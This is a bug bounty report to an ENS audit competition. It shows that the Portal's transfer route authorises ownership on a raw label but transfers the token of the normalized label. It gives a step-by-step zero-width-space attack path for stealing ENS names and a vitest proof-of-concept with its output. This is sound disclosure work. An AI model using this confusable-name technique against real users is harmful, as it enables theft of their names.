# 90639 w a critical transfer authorises the raw label moves the normalized label s token

**Submitted on Aug 26th 2026 at 04:55:39 UTC by @QED for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90639
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs

## Description

## Brief/Intro

The Explorer app (the Portal, `apps/portal`) lets an owner transfer an ENSv2 name. In ENSv2 a name is an ERC-1155 token held in a registry contract, and its token id comes from the hash of the name's first label (its labelhash). The transfer route decides whether the connected wallet may transfer by reading the owner of the **raw** label from the URL. It then derives the token id from the **ENSIP-15 normalized** label. Those are two different tokens when the raw label carries an invisible codepoint. Every surface keeps showing the raw name, so a victim who transfers a worthless gifted name signs away a different, valuable name. The app is Sepolia-only (`apps/portal/src/lib/wagmi.ts` binds `sepoliaWithEns`).

Commit: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`

## Vulnerability Details

### Root Cause

One user action is resolved to two on-chain resources by two code paths. The authorisation path never normalizes: it hands the URL string to the ENSv2 universal resolver, which DNS-encodes it byte for byte. The calldata path always normalizes: it runs `ens_normalize`, then hashes the result. `alice` followed by U+200B ZERO WIDTH SPACE normalizes to `alice`. So the route authorises one token and builds a transfer of another. The Portal knows this rule and applies it on the name overview route, but never on the child transfer route.

The parent route fetches the owner with the raw param at [`$name.tsx:37-38`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name.tsx#L37-L38), and [`resolveEnsOwner.ts:49-50`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/utils/ens/resolveEnsOwner.ts#L49-L50) passes it through unchanged. The transfer route compares the wallet against that owner at [`transfer.tsx:104-106`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/ownership/transfer.tsx#L104-L106). The token id comes from the normalized label at [`useTransferName.ts:112-113`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferName.ts#L112-L113), via [`getLabel.ts:10-19`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/utils/token/getLabel.ts#L10-L19). The calldata is built at [`transferToken.ts:67-71`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/transferToken.ts#L67-L71) while the modal text stays [`Transfer ${name}`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/transferToken.ts#L88), the raw name. The permission pre-check normalizes too ([`useCanTransferName.ts:57-70`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useCanTransferName.ts#L57-L70)), so it green-lights the victim's real name. Contrast [`$name/index.tsx:442,458-459`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/index.tsx#L442-L459), where the overview route does reject a non-normalized name.

### Attack Path

{% stepper %}
{% step %}

## The victim owns `alice.eth` on Sepolia

{% endstep %}

{% step %}

## The attacker registers and transfers `alice\u200B.eth`

The attacker registers `alice\u200B.eth` by calling the registrar directly. The Portal's own registration input would refuse the label (`getLabelRegistrationError` in `apps/portal/src/utils/token/isNormalized.ts:69-82`), but a direct contract call does not pass through it. The attacker then transfers that token to the victim; an ERC-1155 transfer to an EOA needs no consent.
{% endstep %}

{% step %}

## The attacker offers to buy the odd name back, or the victim simply moves it on

{% endstep %}

{% step %}

## The victim opens `/alice\u200B.eth/ownership/transfer`

The page loads, shows the raw name, finds the victim as owner, and enables the form.
{% endstep %}

{% step %}

## The victim enters the attacker's address and confirms

The modal says `Transfer alice\u200B.eth`.
{% endstep %}

{% step %}

## The signed `safeTransferFrom` carries the token id of `alice`

The wallet shows only an opaque uint256, so nothing on screen separates the two names.
{% endstep %}

{% step %}

## `alice.eth` lands in the attacker's wallet

The gifted name never moves.
{% endstep %}
{% endstepper %}

## Impact Details

Direct theft of a user's ENS name. The victim authorises the movement of one token and signs the movement of another. The same divergence drives the flow's detach steps, which also take the normalized label ([`useTransferName.ts:132`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferName.ts#L132)), so the victim's real name has its resolver and subregistry detached before the token moves.

## References

* `apps/portal/src/routes/$name.tsx`, `apps/portal/src/routes/$name/ownership/transfer.tsx`
* `apps/portal/src/utils/ens/resolveEnsOwner.ts`, `apps/portal/src/utils/token/getLabel.ts`
* `apps/portal/src/features/transfer/hooks/useTransferName.ts`, `.../helpers/transferToken.ts`

## Recommended Fix

Resolve the name once, at the top of the route, and carry that one value through the flow. Reject a route param that is not already normalized, the way `$name/index.tsx:458-459` does, before any ownership read runs. Then make the ownership read and the token-id derivation take the same string, so the two can no longer disagree.

## Proof of Concept

The test drives the product's three stages — the route's ownership read, the flow's token-id derivation, and the calldata builder — and records what each puts on the wire. The divergence is not asserted from any string typed in the test: the label used for the ownership check is read back out of the DNS-encoded `findOwner` argument, and the labelhash used for the token id is read back out of the `getTokenId` argument.

Save the fenced diff below as `poc.diff` in the cloned repository root, then run:

```bash
git clone https://github.com/immunefi-team/audit-comp-ens
cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
git apply poc.diff
pnpm install
cd apps/portal
npx vitest run src/features/transfer/confusableTransfer.poc.test.ts --reporter=verbose
```

```diff
diff --git a/apps/portal/src/features/transfer/confusableTransfer.poc.test.ts b/apps/portal/src/features/transfer/confusableTransfer.poc.test.ts
new file mode 100644
index 0000000..f7fc65c
--- /dev/null
+++ b/apps/portal/src/features/transfer/confusableTransfer.poc.test.ts
@@ -0,0 +1,82 @@
+import { type Address, bytesToString, createClient, custom, decodeAbiParameters, decodeFunctionData, encodeAbiParameters, erc1155Abi, type Hex, hexToBytes, labelhash, parseAbiParameters, toFunctionSelector } from 'viem'
+import { describe, expect, it, vi } from 'vitest'
+import { sepoliaWithEns } from '@/test-utils/wagmi.mock'
+
+const st = vi.hoisted(() => ({ client: null as unknown, started: [] as Array<{ request: { data: Hex }; description: string }> }))
+vi.mock('@/lib/wagmi/helpers', async () => {
+  const { ok } = await import('neverthrow')
+  return { safeGetClient: () => ok(st.client), safeGetConnectorClient: vi.fn() }
+})
+vi.mock('@ens-apps/transaction-manager', () => ({
+  transactionManager: { startTransaction: (p: { request: { data: Hex } }, _s: unknown, o: { description: string }) => (st.started.push({ request: p.request, description: o.description }), 'tx-poc') },
+  waitForTransaction: async () => ({ hash: `0x${'11'.repeat(32)}` as Hex }),
+}))
+const { resolveEnsOwner } = await import('@/utils/ens/resolveEnsOwner')
+const { getLabel } = await import('@/utils/token/getLabel')
+const { getEnsTokenId } = await import('@/features/profile/hooks/useTokenId')
+const { transferToken } = await import('@/features/transfer/helpers/transferToken')
+
+const VICTIM = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' as Address
+const ATTACKER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as Address
+const REGISTRY = '0x00000000000000000000000000000000000e7e7e' as Address
+const ZERO = '0x0000000000000000000000000000000000000000' as Address
+const FIND_OWNER = toFunctionSelector('function findOwner(bytes) view returns (address)')
+const FIND_REGISTRIES = toFunctionSelector('function findRegistries(bytes) view returns (address[])')
+const GET_TOKEN_ID = toFunctionSelector('function getTokenId(uint256) view returns (uint256)')
+const RAW_NAME = 'alice​.eth' // "alice" + U+200B ZERO WIDTH SPACE; ens_normalize maps it to "alice"
+
+describe('portal transfer: the raw label authorises, the normalized label moves', () => {
+  it('checks ownership of one resource and signs a transfer of another', async () => {
+    const wire: { ownerName?: Hex; tokenIdArg?: bigint } = {}
+    const client = createClient({
+      chain: sepoliaWithEns,
+      transport: custom({
+        async request({ method, params }) {
+          if (method === 'eth_chainId') return '0xaa36a7'
+          if (method !== 'eth_call') throw new Error(`unexpected ${method}`)
+          const data = (params as [{ data: Hex }])[0].data
+          const sel = data.slice(0, 10)
+          const args = `0x${data.slice(10)}` as Hex
+          if (sel === FIND_OWNER) {
+            wire.ownerName = decodeAbiParameters(parseAbiParameters('bytes'), args)[0]
+            return encodeAbiParameters(parseAbiParameters('address'), [VICTIM])
+          }
+          if (sel === FIND_REGISTRIES) return encodeAbiParameters(parseAbiParameters('address[]'), [[ZERO, REGISTRY, ZERO]])
+          if (sel !== GET_TOKEN_ID) throw new Error(`unexpected selector ${sel}`)
+          const [lh] = decodeAbiParameters(parseAbiParameters('uint256'), args)
+          wire.tokenIdArg = lh
+          return encodeAbiParameters(parseAbiParameters('uint256'), [(lh >> 32n) << 32n])
+        },
+      }),
+    })
+    st.client = client
+
+    // 1. The route's authorisation read ($name.tsx:37-38 -> resolveEnsOwner.ts:49-50).
+    const resolved = await resolveEnsOwner(client as never, RAW_NAME)
+    expect(resolved?.owner).toBe(VICTIM)
+    const nb = hexToBytes(wire.ownerName as Hex)
+    const labelChecked = bytesToString(nb.slice(1, 1 + (nb[0] as number)))
+
+    // 2. The token id the flow will move (useTransferName.ts:112-113).
+    const tokenId = (await getEnsTokenId({ label: getLabel(RAW_NAME), registryAddress: resolved?.registryAddress as Address }))._unsafeUnwrap()
+
+    // 3. The calldata the user is asked to sign (transferToken.ts:67-92).
+    await transferToken({ name: RAW_NAME, registryAddress: resolved?.registryAddress as Address, tokenId, recipient: ATTACKER, walletClient: { account: { address: VICTIM } } as never, publicClient: client as never, signer: {} as never, chainId: sepoliaWithEns.id, id: 'poc' })
+    const sent = st.started[0] as { request: { data: Hex }; description: string }
+    const decoded = decodeFunctionData({ abi: erc1155Abi, data: sent.request.data })
+    const movedTokenId = (decoded.args as readonly unknown[])[2] as bigint
+    const authorised = BigInt(labelhash(labelChecked))
+
+    console.log('ownership checked on label :', JSON.stringify(labelChecked), labelhash(labelChecked))
+    console.log('token id derived from      : 0x' + (wire.tokenIdArg as bigint).toString(16))
+    console.log('shown to the user          :', JSON.stringify(sent.description))
+    console.log('safeTransferFrom tokenId   :', movedTokenId.toString())
+
+    expect(labelChecked).toContain('​')
+    expect(decoded.functionName).toBe('safeTransferFrom')
+    expect(sent.description).toBe(`Transfer ${RAW_NAME}`)
+    expect(wire.tokenIdArg).not.toBe(authorised)
+    expect(movedTokenId >> 32n).not.toBe(authorised >> 32n)
+    expect(movedTokenId >> 32n).toBe((wire.tokenIdArg as bigint) >> 32n)
+  })
+})
```

Output:

```
 RUN  v4.1.5 /tmp/claude-1000/-home-qed-bug-bounty/2a95be94-6b27-4117-831b-15c5753cf8da/scratchpad/wt-verify2/apps/portal

stdout | src/features/transfer/confusableTransfer.poc.test.ts > portal transfer: the raw label authorises, the normalized label moves > checks ownership of one resource and signs a transfer of another
ownership checked on label : "alice​" 0x2707eeb0aa982f9b0e17abff4baeab5388557a5e5e5ed0e050e9da5da56807de
token id derived from      : 0x9c0257114eb9399a2985f8e75dad7600c5d89fe3824ffa99ec1c3eb8bf3b0501
shown to the user          : "Transfer alice​.eth"
safeTransferFrom tokenId   : 70564938991660933374592024341600875602376452319261984317470407481572850663424

 ✓ src/features/transfer/confusableTransfer.poc.test.ts > portal transfer: the raw label authorises, the normalized label moves > checks ownership of one resource and signs a transfer of another 79ms

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Start at  23:34:29
   Duration  960ms (transform 378ms, setup 36ms, import 632ms, tests 79ms, environment 92ms)
```

`0x2707eeb0…` is `labelhash("alice" + U+200B)`. `0x9c025711…` is `labelhash("alice")`. The route authorised the first and signed a transfer of the second, while telling the user it was moving `alice\u200B.eth`.
